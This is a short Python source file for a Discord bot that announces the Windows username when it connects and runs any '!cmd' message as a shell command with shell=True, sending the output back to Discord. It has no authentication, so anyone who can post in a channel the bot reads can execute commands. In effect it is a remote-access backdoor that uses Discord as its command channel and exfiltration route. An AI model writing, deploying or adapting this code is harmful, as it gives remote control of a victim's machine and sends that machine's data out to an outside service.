import discord
import os
import subprocess

# Configure bot, token and channel ids
intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)
token = ''
channel_id = ''

@client.event
async def on_ready():
    print(f'User Logged: {client.user.name}')

# Send message to the channel when user logs in to windows
async def send_startup_message():
    channel = client.get_channel(channel_id)

    if channel:
        await channel.send(f"Logged in to Windows with the username {os.getlogin()}!")

@client.event
async def on_connect():
    await send_startup_message()

@client.event 
async def on_message(message): 
    username = str(message.author).split("#")[0] 
    channel = str(message.channel.name) 
    user_message = str(message.content) 
  
    print(f'Message {user_message} by {username} on {channel}') 
  
    if message.author == client.user: 
        return
    # Bot test run
    if user_message.lower() == "hello": 
        await message.channel.send(f'Hello {username}') 
        return  
    elif user_message.startswith("!cmd"):
        command = user_message[5:].strip()
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='cp850')
            if len(result) >= 2000:
                with open('result.txt','w') as file:
                    file.write(result)
                await message.channel.send(f"The result exceeds the limit of 2000 characters, an archive has been sent with the result.\nResult of `{command}`: ", file=discord.File('result.txt'))
            else:
                await message.channel.send(f"Result of `{command}`:\n```\n{result}\n```")
        except Exception as e:
            await message.channel.send(f"Error al ejecutar el comando: {e}")

client.run(token)
